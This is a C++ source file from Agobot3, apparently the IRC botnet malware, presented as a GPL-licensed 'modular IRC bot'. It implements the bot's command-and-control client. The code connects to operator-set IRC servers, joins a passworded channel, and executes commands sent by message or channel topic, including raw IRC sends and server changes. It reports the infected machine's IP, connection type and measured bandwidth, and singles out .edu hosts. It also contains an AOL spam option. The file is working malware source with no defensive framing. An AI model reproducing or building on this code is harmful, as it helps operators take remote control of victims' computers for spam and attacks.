/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "main.h"
#include "mainctrl.h"

#ifdef WIN32
typedef int (__stdcall *IGCSE)(LPDWORD, char *, DWORD, DWORD);
IGCSE fInternetGetConnectedStateEx;
#endif

CIRC::CIRC() {
	m_szType="CIRC";
	// Initialize/Clear all variables
	m_bRunning=true; m_bConnected=false; m_bJoined=false;
	m_iFailCount=0; m_iServerNum=0;
	m_sLocalHost.Assign(""); // Clear the localhost to prevent crash with servers that don't do userhost
	m_lLastRecv=GetTickCount();

#ifndef AGOBOT_NO_OPENSSL
	// Initialize SSL Socket
	m_csslSocket.Init();
#endif AGOBOT_NO_OPENSSL
}

void *CIRC::Run() {
	while(m_bRunning && g_pMainCtrl->m_bRunning) {
		if(!g_pMainCtrl->m_bRunning || !m_bRunning) break;
		if((m_iServerNum==0 && m_iFailCount>1) || (m_iServerNum!=0 && m_iFailCount>1)) {
			// Reset CIRC values, disconnect the sockets, and clear the logins
			m_bJoined=false; m_bConnected=false; m_sSocket.Disconnect();
			g_pMainCtrl->m_cMac.ClearLogins();

#ifdef DBGCONSOLE
			if(!m_iServerNum) // If its the root server, use another text
				g_pMainCtrl->m_cConsDbg.Log(1, "CIRC(0x%8.8Xh): Giving up root server \"%s:%d\" after %d retries!\n", this, g_pMainCtrl->m_cBot.si_server.sValue.CStr(), g_pMainCtrl->m_cBot.si_port.iValue, m_iFailCount);
			else
				g_pMainCtrl->m_cConsDbg.Log(2, "CIRC(0x%8.8Xh): Giving up server \"%s:%d\" after %d retries!\n", this, g_pMainCtrl->m_cBot.si_server.sValue.CStr(), g_pMainCtrl->m_cBot.si_port.iValue, m_iFailCount);
#endif // DBGCONSOLE

			// Select new server
			m_iServerNum++;
			
			if(m_iServerNum>m_vServers.size()-1)
			{
				Execute("ipconfig.exe", "/flushdns");
				#ifdef DBGCONSOLE
					g_pMainCtrl->m_cConsDbg.Log(4, "CIRC(0x%8.8Xh): Flushed DNS Cache!\n", this);
				#endif // DBGCONSOLE
				m_iServerNum=0;
			}

			m_iFailCount=0; // Reset the failure count
			// Set the cvars to the new values
			g_pMainCtrl->m_cCVar.SetCVar(&g_pMainCtrl->m_cBot.si_chanpass, \
				m_vServers.at(m_iServerNum)->si_chanpass.sValue);
			g_pMainCtrl->m_cCVar.SetCVar(&g_pMainCtrl->m_cBot.si_mainchan, \
				m_vServers.at(m_iServerNum)->si_mainchan.sValue);
			g_pMainCtrl->m_cCVar.SetCVar(&g_pMainCtrl->m_cBot.si_nickprefix, \
				m_vServers.at(m_iServerNum)->si_nickprefix.sValue);
			g_pMainCtrl->m_cCVar.SetCVar(&g_pMainCtrl->m_cBot.si_port, \
				m_vServers.at(m_iServerNum)->si_port.sValue);
			g_pMainCtrl->m_cCVar.SetCVar(&g_pMainCtrl->m_cBot.si_server, \
				m_vServers.at(m_iServerNum)->si_server.sValue);
			g_pMainCtrl->m_cCVar.SetCVar(&g_pMainCtrl->m_cBot.si_servpass, \
				m_vServers.at(m_iServerNum)->si_servpass.sValue);
			g_pMainCtrl->m_cCVar.SetCVar(&g_pMainCtrl->m_cBot.si_usessl, \
				m_vServers.at(m_iServerNum)->si_usessl.sValue);
			m_lLastRecv=GetTickCount(); }
		if(!m_bConnected) { // We're not connected yet, connect to the server
			// Start IdentD
			if(!g_pMainCtrl->m_bIdentD_Running && g_pMainCtrl->m_cBot.identd_enabled.bValue)
				g_pMainCtrl->m_cIdentD.Start(false);
			// Setup vars, resolve address
			sockaddr_in ssin; int iErr; memset(&ssin, 0, sizeof(ssin)); ssin.sin_family=AF_INET;

#ifdef DBGCONSOLE
			g_pMainCtrl->m_cConsDbg.Log(4, "CIRC(0x%8.8Xh): Trying to connect to \"%s:%d\"...\n", this, g_pMainCtrl->m_cBot.si_server.sValue.CStr(), g_pMainCtrl->m_cBot.si_port.iValue);
#endif // DBGCONSOLE

			// Try to connect to the server
			if(!m_sSocket.Connect(	g_pMainCtrl->m_cBot.si_server.sValue.CStr(), 
									g_pMainCtrl->m_cBot.si_port.iValue,
									false, g_pMainCtrl->m_cBot.si_usessl.bValue)) { // Connect failed, exit
#ifdef DBGCONSOLE
				g_pMainCtrl->m_cConsDbg.Log(4, "CIRC(0x%8.8Xh): Connection to \"%s:%d\" failed!\n", this, g_pMainCtrl->m_cBot.si_server.sValue.CStr(), g_pMainCtrl->m_cBot.si_port.iValue);
#endif // DBGCONSOLE
				Sleep(10000); m_bConnected=false; m_iFailCount++; continue;
			} else { // Connection established
#ifdef DBGCONSOLE
				g_pMainCtrl->m_cConsDbg.Log(3, "CIRC(0x%8.8Xh): Connection to \"%s:%d\" established!\n", this, g_pMainCtrl->m_cBot.si_server.sValue.CStr(), g_pMainCtrl->m_cBot.si_port.iValue);
#endif // DBGCONSOLE
				m_bConnected=true; m_bJoined=false; }

			m_lLastRecv=GetTickCount();

			// Get local ip address
			sockaddr sa; socklen_t sas=sizeof(sa); memset(&sa, 0, sizeof(sa)); m_sSocket.GetSockName(&sa, &sas);
			char szTemp[64]; sprintf(szTemp, "%d.%d.%d.%d", (unsigned char)sa.sa_data[2], (unsigned char)sa.sa_data[3], \
				(unsigned char)sa.sa_data[4], (unsigned char)sa.sa_data[5]);
			m_sLocalIp.Assign(szTemp); m_lLocalAddr=inet_addr(szTemp);

			// Send the server password
			if(g_pMainCtrl->m_cBot.si_servpass.sValue.Compare(""))
				SendRawFormat("PASS %s\r\n", g_pMainCtrl->m_cBot.si_servpass.sValue.CStr());

			// Send the nick and register with the irc server
			SendRawFormat("NICK %s\r\nUSER %s 0 0 :%s\r\n", g_pMainCtrl->m_sUserName.CStr(), \
				g_pMainCtrl->m_sUserName.CStr(), g_pMainCtrl->m_sUserName.CStr());
		} else {
			char szLine[8192]; memset(szLine, 0, sizeof(szLine));
			// Wait for a complete line to be received
			bool bRecvd=false;
				bRecvd=m_sSocket.RecvLineIRC(szLine, sizeof(szLine));
			if(bRecvd) {
				m_lLastRecv=GetTickCount(); CString sLine(szLine);
#ifdef DBGCONSOLE
				g_pMainCtrl->m_cConsDbg.Log(3, "CIRC(0x%8.8Xh): Received: \"%s\"\n", this, sLine.CStr());
#endif // DBGCONSOLE

				// Set m_bJoined if we joined the channel
				if(!sLine.Token(1, " ").Compare("353") && \
				   !sLine.Token(4, " ").Compare(g_pMainCtrl->m_cBot.si_mainchan.sValue))
				   m_bJoined=true;

				// Send PONG if we're PING'ed
				else if(!sLine.Token(0, " ").Compare("PING")) {
					SendRawFormat("PONG %s\r\n", sLine.Token(1, " ").CStr());
					if(!m_bJoined) SendRawFormat("JOIN %s %s\r\n", \
						g_pMainCtrl->m_cBot.si_mainchan.sValue.CStr(), \
						g_pMainCtrl->m_cBot.si_chanpass.sValue.CStr()); }

				else if(!sLine.Token(1, " ").Compare("NOTICE")) {
					if(sLine.Token(18, " ").Compare("")) {
						if(!sLine.Token(17, " ").Compare("pong"))
							SendRawFormat("PONG %s\r\n", sLine.Token(18, " ").CStr());
						if(!m_bJoined) SendRawFormat("JOIN %s %s\r\n", \
							g_pMainCtrl->m_cBot.si_mainchan.sValue.CStr(), \
							g_pMainCtrl->m_cBot.si_chanpass.sValue.CStr()); } }

				// Connected to the server, get the hostname
				else if(!sLine.Token(1, " ").Compare("001")) {
					// Get the hostname
					char *h=strstr(sLine.Str(), "@");
					if(h) {m_sLocalHost.Assign(h+1);}
					
					if(!m_bJoined) {
						SendRawFormat("JOIN %s %s\r\n", \
						g_pMainCtrl->m_cBot.si_mainchan.sValue.CStr(), \
						g_pMainCtrl->m_cBot.si_chanpass.sValue.CStr());
						while(!g_pMainCtrl->m_cStartupThread.m_bCanSpamAOLSet) Sleep(1000);
						if(g_pMainCtrl->m_cStartupThread.m_bCanSpamAOL && g_pMainCtrl->m_cBot.spam_aol_enabled.bValue)
							SendRawFormat("JOIN %s %s\r\n", \
							g_pMainCtrl->m_cBot.spam_aol_channel.sValue.CStr(), \
							g_pMainCtrl->m_cBot.si_chanpass.sValue.CStr()); }
					if(m_sLocalHost.GetLength()<1)
					{ SendRawFormat("USERHOST %s\r\n", g_pMainCtrl->m_sUserName.CStr()); }
				}
				
				// Get the hostname
				else if(!sLine.Token(1, " ").Compare("302")) {
					CString sTemp=sLine.Token(3, " ");
					char *h=strstr(sTemp.Str(), "@");
						if(h) m_sLocalHost.Assign(h+1);
				}

				// End of names list
				else if(!sLine.Token(1, " ").Compare("366")) {
					if (!sLine.Token(3, " ").Compare(g_pMainCtrl->m_cBot.si_mainchan.sValue))
					{m_bJoined=true;}
					SendRawFormat("MODE %s\r\n", sLine.Token(3, " ").CStr());
				}

				// Get channel modes on JOIN
				else if(!sLine.Token(1, " ").Compare("324")) {
					CString sTemp=sLine.Token(4, " ");
					if (sTemp.Find("m") != 0)
					{
						setSilent(sLine.Token(3, " "),1);
					}
					else
					{
						setSilent(sLine.Token(3, " "),0);
					}
				}

				// Get channel modes on MODE
				else if(!sLine.Token(1, " ").Compare("MODE")) {
					CString sTemp=sLine.Token(3, " ");
					int tmpintPlus=0, tmpintMinus=0;
					CString modePlus="", modeMinus="";
					tmpintPlus = sTemp.Find("+");
					tmpintMinus = sTemp.Find("-");
					if (tmpintPlus != 0) modePlus = sTemp.Mid(tmpintPlus);
					if (tmpintMinus != 0) modeMinus = sTemp.Mid(tmpintMinus);
					if (isSilent(sLine.Token(2, " ")) && modePlus.Find("m") != 0) 
					{ setSilent(sLine.Token(2, " "),1); }
					if (isSilent(sLine.Token(2, " ")) && modeMinus.Find("m") != 0)
					{ setSilent(sLine.Token(2, " "),0); }
					if (modePlus.Find("v") != 0  && (!sLine.Token(4, " ").Compare(g_pMainCtrl->m_sUserName)))
					{ setSilent(sLine.Token(2, " "),0); }
					if (isSilent(sLine.Token(2, " ")) && modeMinus.Find("v") != 0 && (!sLine.Token(4, " ").Compare(g_pMainCtrl->m_sUserName)))
					{ setSilent(sLine.Token(2, " "),1); }
				}

				// Its a topic, check for topic command
				else if(!sLine.Token(1, " ").Compare("332") && \
					g_pMainCtrl->m_cBot.bot_topiccmd.bValue) {
					CString sTopic=sLine.Token(1, ":");
					CMessage *msg=new CMessage; CCmdExecutor *ex=new CCmdExecutor;
					// Check silent and notice parameters, and set bool flags accordingly
					if(sLine.Find(" -s")) msg->bSilent=true; else msg->bSilent=false;
					if(sLine.Find(" -n")) msg->bNotice=true; else msg->bNotice=false;
					if(sLine.Find(" -o")) msg->bOutchan=true; else msg->bOutchan=false;

					msg->sSrc.Assign(sLine.Token(3, " ")); msg->sIdentd.Assign("TopicCmd");
					msg->sHost.Assign("TopicCmd.Net"); msg->sDest.Assign("TopicCmd");
					msg->sChatString.Assign(sTopic);

					// Let the bot handle it internally
					ex->Set(msg, true); delete msg;
					ex->Start(true);
				}

				// Its a private message
				else if(!sLine.Token(1, " ").Compare("PRIVMSG")) {
					CMessage *msg=new CMessage; CCmdExecutor *ex=new CCmdExecutor;
					// Check silent and notice parameters, and set bool flags accordingly
					if(sLine.Find(" -s")) msg->bSilent=true; else msg->bSilent=false;
					if(sLine.Find(" -n")) msg->bNotice=true; else msg->bNotice=false;
					if(sLine.Find(" -o")) msg->bOutchan=true; else msg->bOutchan=false;
					// Parse the strings, and insert them into the message
					msg->sSrc.Assign(sLine.Token(0, ":").Token(0, " ").Token(0, "!"));
					msg->sIdentd.Assign(sLine.Token(1, "!").Token(0, "@"));
					msg->sHost.Assign(sLine.Token(1, "@").Token(0, " "));
					msg->sDest.Assign(sLine.Token(2, " "));
					char *szText=strstr(sLine.Str(), " :");
					if(szText) msg->sChatString.Assign(szText+2); else msg->sChatString.Assign("");
#ifdef DBGCONSOLE
					g_pMainCtrl->m_cConsDbg.Log(1, "CIRC(0x%8.8Xh): %s / %s / %s / %s / \"%s\"...\n", \
						this, msg->sSrc.CStr(), msg->sIdentd.CStr(), msg->sHost.CStr(), \
						msg->sDest.CStr(), msg->sChatString.CStr());
#endif
					// Let the bot handle it
					ex->Set(msg); delete msg;
					ex->Start(true);
				}
				
				// Someone got kicked, maybe the bot itself
				else if(!sLine.Token(1, " ").Compare("KICK")) {
					// If someone is logged in by that name, log him out
					login *pLogin=g_pMainCtrl->m_cMac.FindLogin(sLine.Token(3, " "));
					if(pLogin) g_pMainCtrl->m_cMac.DelLogin(sLine.Token(3, " "), sLine.Token(3, " "));

					// If the bot itself is kicked, rejoin, and send "screw you %s!"
					if(!sLine.Token(3, " ").Compare(g_pMainCtrl->m_sUserName)) {
						CString sName(sLine.Token(1, ":").Token(0, "!").CStr());
						m_bJoined=false; SendRawFormat("JOIN %s %s\r\n", \
							g_pMainCtrl->m_cBot.si_mainchan.sValue.CStr(), \
							g_pMainCtrl->m_cBot.si_chanpass.sValue.CStr());
						SendRawFormat("PRIVMSG %s :screw you %s!\r\n", g_pMainCtrl->m_cBot.si_mainchan.sValue.CStr(), sName.CStr()); } }

				// Someone changed his nickname
				else if(!sLine.Token(1, " ").Compare("NICK")) {
					// Check if hes logged in, if so, replace the username in CMac
					CString sOldNick(sLine.Token(1, ":").Token(0, "!").CStr());
					if(!strstr(sLine.Str(), " :")) continue;
					CString sNewNick(strstr(sLine.Str(), " :"));
					if(sOldNick.Compare("") && sNewNick.Compare("")) {
						login *pLogin=g_pMainCtrl->m_cMac.FindLogin(sOldNick);
						if(pLogin) pLogin->sIRCUsername.Assign(sNewNick);
						if(!sOldNick.Compare(g_pMainCtrl->m_sUserName)) g_pMainCtrl->m_sUserName.Assign(sNewNick); } }

				// Someone left the channel
				else if(!sLine.Token(1, " ").Compare("PART") || !sLine.Token(1, " ").Compare("QUIT")) {
					// Check if hes logged in, if so, log him out
					login *pLogin=g_pMainCtrl->m_cMac.FindLogin(sLine.Token(1, ":").Token(0, "!"));
					if(pLogin) g_pMainCtrl->m_cMac.DelLogin(sLine.Token(1, ":").Token(0, "!"), sLine.Token(1, ":").Token(0, "!")); }
			} else { // We didn't receive a valid line, or the server closed the connection
				Fail(); continue;
			}
		}
	}

	return NULL;
}

void CIRC::Init()
{	REGCMD(m_cmdDisconnect,	"irc.disconnect",	"disconnects the bot from irc",				false,	this);
	REGCMD(m_cmdAction,		"irc.action",		"lets the bot perform an action",			false,	this);
	REGCMD(m_cmdGetEdu,		"irc.getedu",		"prints netinfo when the bot is .edu",		false,	this);
	REGCMD(m_cmdGetHost,	"irc.gethost",		"prints netinfo when host matches",			false,	this);
	REGCMD(m_cmdJoin,		"irc.join",			"makes the bot join a channel",				false,	this);
	REGCMD(m_cmdMode,		"irc.mode",			"lets the bot perform a mode change",		false,	this);
	REGCMD(m_cmdNetInfo,	"irc.netinfo",		"prints netinfo",							false,	this);
	REGCMD(m_cmdPart,		"irc.part",			"makes the bot part a channel",				false,	this);
	REGCMD(m_cmdPrivMsg,	"irc.privmsg",		"sends a privmsg",							false,	this);
	REGCMD(m_cmdQuit,		"irc.quit",			"quits the bot",							false,	this);
	REGCMD(m_cmdRaw,		"irc.raw",			"sends a raw message to the irc server",	false,	this);
	REGCMD(m_cmdReconnect,	"irc.reconnect",	"reconnects to the server",					false,	this);
	REGCMD(m_cmdServer,		"irc.server",		"changes the server the bot connects to",	false,	this); }

bool CIRC::HandleCommand(CMessage *pMsg)
{	if(!pMsg->sCmd.Compare("irc.disconnect") || !pMsg->sCmd.Compare("irc.reconnect"))
	{	m_iServerNum=0; m_iFailCount=0;
		m_bJoined=false; m_bConnected=false; m_sSocket.Disconnect();
		g_pMainCtrl->m_cMac.ClearLogins(); }

	else if(!pMsg->sCmd.Compare("irc.quit"))
	{	Disconnect();
		g_pMainCtrl->m_bRunning=false; }

	else if(!pMsg->sCmd.Compare("irc.action"))
	{	SendFormat(false, false, pMsg->sChatString.Token(1, " ").Str(), \
			"\1ACTION %s\1", pMsg->sChatString.Token(2, " ", true).CStr()); }

	else if(!pMsg->sCmd.Compare("irc.netinfo"))
	{	SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), "%s", NetInfo().CStr()); }

	else if(!pMsg->sCmd.Compare("irc.getedu"))
	{	if(m_sLocalHost.Find(".edu") || m_sLocalHost.Find(".Edu") || m_sLocalHost.Find(".EDU"))
			SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), "%s", NetInfo().CStr()); }

	else if(!pMsg->sCmd.Compare("irc.gethost"))
	{	if(m_sLocalHost.Find(pMsg->sChatString.Token(1, " ")))
			SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), "%s", NetInfo().CStr()); }

	else if(!pMsg->sCmd.Compare("irc.join"))
	{	SendRawFormat("JOIN %s %s\r\n", pMsg->sChatString.Token(1, " ").CStr(), pMsg->sChatString.Token(2, " ").CStr()); }

	else if(!pMsg->sCmd.Compare("irc.part"))
	{	SendRawFormat("PART %s\r\n", pMsg->sChatString.Token(1, " ").CStr()); }

	else if(!pMsg->sCmd.Compare("irc.raw"))
	{	CString sStr; sStr.Format("%s\r\n", pMsg->sChatString.Token(1, " ", true).CStr());
		SendRaw(sStr.Str()); }

	else if(!pMsg->sCmd.Compare("irc.privmsg"))
	{	SendMsg(false, false, pMsg->sChatString.Token(2, " ", true).Str(), pMsg->sChatString.Token(1, " ").Str()); }

	else if(!pMsg->sCmd.Compare("irc.mode"))
	{	SendRawFormat("MODE %s %s %s\r\n", pMsg->sChatString.Token(1, " ").CStr(), pMsg->sChatString.Token(2, " ").CStr(), pMsg->sChatString.Token(3, " ").CStr()); }

	else if(!pMsg->sCmd.Compare("irc.server"))
	{	g_pMainCtrl->m_cCVar.SetCVar(&g_pMainCtrl->m_cBot.si_server, pMsg->sChatString.Token(1, " ").CStr());
		g_pMainCtrl->m_cCVar.SetCVar(&g_pMainCtrl->m_cBot.si_port, pMsg->sChatString.Token(2, " ").CStr());
		g_pMainCtrl->m_cCVar.SetCVar(&g_pMainCtrl->m_cBot.si_servpass, pMsg->sChatString.Token(3, " ").CStr()); }

	return false; }

CString CIRC::NetInfo()
{	CString sNetInfo; sockaddr sa; socklen_t sas;
	// get ip address
	sas=sizeof(sa); memset(&sa, 0, sizeof(sa)); m_sSocket.GetSockName(&sa, &sas);

#ifdef WIN32
	// get connection type/name
	unsigned long n; char ctype[8]; char cname[128];
	memset(cname, 0, sizeof(cname)); memset(ctype, 0, sizeof(ctype));
	HINSTANCE wininet_dll=LoadLibrary("WININET.DLL");
    if(wininet_dll)
	{ 	fInternetGetConnectedStateEx=(IGCSE)GetProcAddress(wininet_dll, "InternetGetConnectedStateEx");
 		if(!fInternetGetConnectedStateEx)
		{	fInternetGetConnectedStateEx(&n, (char *)&cname, sizeof(cname), 0);
			if(n&&INTERNET_CONNECTION_MODEM==INTERNET_CONNECTION_MODEM)
				strncpy(ctype, "dial-up", sizeof(ctype)-1);
			else
				strncpy(ctype, "LAN", sizeof(ctype)-1); }
		else
		{	strncpy(ctype, "N/A", sizeof(ctype)-1);
			strncpy(cname, "N/A", sizeof(cname)-1); } }
#else
	// Fixme! add connection type detection for linux
#endif // WIN32

	char szIP[16]; sprintf(szIP, "%d.%d.%d.%d",
		(unsigned char)sa.sa_data[2], (unsigned char)sa.sa_data[3], \
		(unsigned char)sa.sa_data[4], (unsigned char)sa.sa_data[5]);

	sNetInfo.Assign(""); sNetInfo.Append("connection type: ");

#ifdef WIN32
	sNetInfo.Append(ctype); sNetInfo.Append(" ("); sNetInfo.Append(cname); sNetInfo.Append("). ");
#else
	sNetInfo.Append("Linux. ");
#endif // WIN32

		sNetInfo.Append("local IP address: "); sNetInfo.Append(szIP); sNetInfo.Append(". ");
		sNetInfo.Append("connected from: "); sNetInfo.Append(m_sLocalHost); sNetInfo.Append(". ");
		sNetInfo.Append("private ip: ");
	if(IsPrivate(szIP))
		sNetInfo.Append("yes. ");
	else
		sNetInfo.Append("no. ");

	if(g_pMainCtrl->m_cStartupThread.m_bDataSet)
	{
		CString sTempBuf; sTempBuf.Format("speed: EU(%d kbit/s) US(%d kbit/s) ASIA(%d kbit/s) Total(%d kbit/s) ",
			g_pMainCtrl->m_cStartupThread.m_speedData.lEUSpeed, g_pMainCtrl->m_cStartupThread.m_speedData.lUSSpeed, 
			g_pMainCtrl->m_cStartupThread.m_speedData.lASIASpeed, g_pMainCtrl->m_cStartupThread.m_speedData.lTotalSpeed);
		sNetInfo.Append(sTempBuf);
	}

#ifdef WIN32
	FreeLibrary(wininet_dll);
#endif // WIN32

	return sNetInfo; }

bool CIRC::SendRaw(char *szMsg)
{
	if(!m_sSocket.Write(szMsg, strlen(szMsg)))
	{	m_bJoined=false; m_bConnected=false; m_sSocket.Disconnect();
		g_pMainCtrl->m_cMac.ClearLogins(); return false; }
	else return true;
}

bool CIRC::SendRawFormat(const char *szFmt, ...)
{	va_list va_alist; char formatbuf[8192]; va_start(va_alist, szFmt);
	vsnprintf(formatbuf, sizeof(formatbuf), szFmt, va_alist); va_end(va_alist);
	return SendRaw(formatbuf); }

bool CIRC::SendMsg(bool bSilent, bool bNotice, char *szMsg, char *szDst)
{	if(bSilent) return false; if (isSilent(szDst)) return false; CString sTheCmd; if(bNotice) sTheCmd.Assign("NOTICE"); else sTheCmd.Assign("PRIVMSG");
	CString sSendBuf; sSendBuf.Format("%s %s :%s\r\n", sTheCmd.CStr(), szDst, szMsg);
	return SendRaw(sSendBuf.Str()); }
bool CIRC::SendFormat(bool bSilent, bool bNotice, char *szDst, const char *szFmt, ...)
{	va_list va_alist; char formatbuf[8192]; va_start(va_alist, szFmt);
	vsnprintf(formatbuf, sizeof(formatbuf), szFmt, va_alist); va_end(va_alist);
	return SendMsg(bSilent, bNotice, formatbuf, szDst); }

void CIRC::Fail()
{	Disconnect(); m_iFailCount++; }

void CIRC::Disconnect()
{	m_bJoined=false; m_bConnected=false; m_sSocket.Disconnect();
	g_pMainCtrl->m_cMac.ClearLogins(); }
